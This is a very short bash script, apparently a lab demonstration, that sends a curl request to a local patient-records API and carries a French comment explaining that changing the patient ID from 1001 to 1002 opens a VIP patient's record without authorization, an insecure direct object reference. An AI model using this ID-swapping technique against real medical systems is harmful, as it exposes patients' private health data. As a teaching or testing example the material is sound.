#!/bin/bash
curl -X GET 'http://127.0.0.1:3333/api/patients/1001' -H 'Authorization: Bearer patient_token'
# Vulnérabilité : changer 1001 en 1002 pour accéder au dossier VIP sans autorisation !